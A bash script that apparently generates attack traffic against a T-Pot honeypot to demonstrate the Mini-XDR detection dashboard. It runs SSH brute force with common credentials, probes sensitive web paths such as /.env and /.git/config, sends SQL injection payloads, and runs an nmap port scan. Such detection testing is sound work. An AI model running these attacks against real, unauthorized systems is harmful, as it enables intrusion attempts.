#!/bin/bash
# ========================================================================
# Mini-XDR Demo Attack Simulation
# ========================================================================
# This script runs a coordinated attack against T-Pot for demo purposes
# Shows SSH brute force, web scanning, SQL injection, and port scanning
# ========================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
TPOT_IP="${TPOT_IP:-24.11.0.176}"
DEMO_MODE="${DEMO_MODE:-true}"  # Adds pauses and visual feedback

echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           Mini-XDR Demo Attack Simulation                      ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Target T-Pot: ${GREEN}$TPOT_IP${NC}"
echo -e "${CYAN}Demo Mode: ${GREEN}$DEMO_MODE${NC}"
echo ""
echo -e "${YELLOW}⚠️  This will simulate real attacks. Use only on authorized systems!${NC}"
echo ""

if [ "$DEMO_MODE" == "true" ]; then
    read -p "Press Enter to start attack simulation..." -r
    echo ""
fi

# ========================================================================
# Phase 1: SSH Brute Force Attack
# ========================================================================
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}🎯 Phase 1: SSH Brute Force Attack${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}Launching SSH brute force with common credentials...${NC}"

# Common credentials to try
USERNAMES=("root" "admin" "test" "user" "administrator")
PASSWORDS=("admin123" "password" "123456" "root" "admin")

# Try SSH connections (they will fail, but get logged)
SSH_ATTEMPTS=5
for i in $(seq 1 $SSH_ATTEMPTS); do
    USER=${USERNAMES[$((RANDOM % ${#USERNAMES[@]}))]}
    PASS=${PASSWORDS[$((RANDOM % ${#PASSWORDS[@]}))]}

    echo -e "${BLUE}  Attempt $i/$SSH_ATTEMPTS: ${CYAN}$USER${NC}:${CYAN}$PASS${NC}"

    if command -v sshpass &> /dev/null; then
        # Use sshpass if available
        timeout 3 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $USER@$TPOT_IP "echo test" 2>&1 | head -1 | sed 's/^/    /' &
    else
        # Fallback: just attempt connection (will prompt for password, will timeout)
        timeout 2 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $USER@$TPOT_IP "echo test" 2>&1 | head -1 | sed 's/^/    /' &
    fi

    sleep 0.5
done

# Wait for background jobs
wait

echo -e "${GREEN}✓${NC} SSH brute force complete ($SSH_ATTEMPTS attempts)"
echo ""

if [ "$DEMO_MODE" == "true" ]; then
    sleep 2
fi

# ========================================================================
# Phase 2: Web Application Scanning
# ========================================================================
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}🌐 Phase 2: Web Application Scanning${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}Scanning for common web vulnerabilities...${NC}"

# Common paths to probe
WEB_PATHS=(
    "/admin"
    "/wp-admin"
    "/wp-login.php"
    "/.git/config"
    "/phpMyAdmin"
    "/phpmyadmin"
    "/.env"
    "/config.php"
    "/admin.php"
    "/backup.sql"
)

for path in "${WEB_PATHS[@]}"; do
    echo -e "${BLUE}  GET http://$TPOT_IP${CYAN}$path${NC}"
    timeout 2 curl -s -o /dev/null -w "    Status: %{http_code}\n" "http://$TPOT_IP$path" 2>&1 || echo "    Status: Timeout"
    sleep 0.3
done

echo -e "${GREEN}✓${NC} Web scanning complete (${#WEB_PATHS[@]} paths probed)"
echo ""

if [ "$DEMO_MODE" == "true" ]; then
    sleep 2
fi

# ========================================================================
# Phase 3: SQL Injection Testing
# ========================================================================
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}💉 Phase 3: SQL Injection Testing${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}Testing for SQL injection vulnerabilities...${NC}"

# SQL injection payloads
SQL_PAYLOADS=(
    "admin' OR 1=1--"
    "' UNION SELECT version()--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    "admin'--"
    "' OR 'a'='a"
)

SQL_ENDPOINTS=(
    "/login"
    "/search"
    "/product"
    "/user"
)

for endpoint in "${SQL_ENDPOINTS[@]}"; do
    PAYLOAD=${SQL_PAYLOADS[$((RANDOM % ${#SQL_PAYLOADS[@]}))]}
    ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
    echo -e "${BLUE}  GET $endpoint?id=${CYAN}$PAYLOAD${NC}"
    timeout 2 curl -s -o /dev/null "http://$TPOT_IP$endpoint?id=$ENCODED_PAYLOAD" 2>&1 | head -1
    sleep 0.3
done

echo -e "${GREEN}✓${NC} SQL injection testing complete"
echo ""

if [ "$DEMO_MODE" == "true" ]; then
    sleep 2
fi

# ========================================================================
# Phase 4: Port Reconnaissance
# ========================================================================
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}🔍 Phase 4: Port Reconnaissance${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}Running port scan on common services...${NC}"

# Quick port scan
PORTS="22,80,443,3389,3306,5432,6379,8080,8443"
echo -e "${BLUE}  Scanning ports: ${CYAN}$PORTS${NC}"

nmap -p $PORTS --max-retries 1 -T4 --host-timeout 10s $TPOT_IP 2>&1 | grep -E "^[0-9]+/(tcp|udp)" | sed 's/^/  /' || echo "  (scan in progress)"

echo -e "${GREEN}✓${NC} Port scan complete"
echo ""

# ========================================================================
# Summary
# ========================================================================
echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                 Attack Simulation Complete!                    ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}📊 Attack Summary:${NC}"
echo -e "  • SSH Brute Force: ${GREEN}$SSH_ATTEMPTS attempts${NC}"
echo -e "  • Web Scanning: ${GREEN}${#WEB_PATHS[@]} paths${NC}"
echo -e "  • SQL Injection: ${GREEN}4 endpoints tested${NC}"
echo -e "  • Port Scanning: ${GREEN}9 ports${NC}"
echo ""
echo -e "${BLUE}🔍 Check Mini-XDR Dashboard:${NC}"
echo -e "  • Incidents: ${CYAN}http://localhost:3000/incidents${NC}"
echo -e "  • Dashboard: ${CYAN}http://localhost:3000${NC}"
echo ""
echo -e "${YELLOW}📝 Expected Results:${NC}"
echo -e "  ✓ Multiple incidents created in Mini-XDR"
echo -e "  ✓ ML models should score attacks as high-risk (80-100)"
echo -e "  ✓ AI agents should provide threat analysis"
echo -e "  ✓ Source IP: $TPOT_IP should be flagged"
echo ""
echo -e "${GREEN}✨ Ready to showcase incident response! ✨${NC}"
echo ""
